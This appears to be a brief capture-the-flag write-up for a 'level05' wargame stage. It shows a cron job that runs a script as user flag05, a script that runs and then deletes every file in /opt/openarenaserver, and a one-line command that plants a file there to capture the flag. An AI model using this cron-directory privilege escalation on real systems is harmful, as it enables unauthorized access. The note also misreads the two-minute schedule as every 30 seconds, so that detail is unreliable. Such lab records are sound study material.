`cat /var/mail/level05` -> `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
Every 30s the *openarenaserver* is executed as flag05

`cat /usr/sbin/openarenaserver`
->
```bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
 every file is executed and remoted

```bash
echo 'getflag > /tmp/t' > /opt/openarenaserver/t
```

wait 30s then `cat /tmp/t`






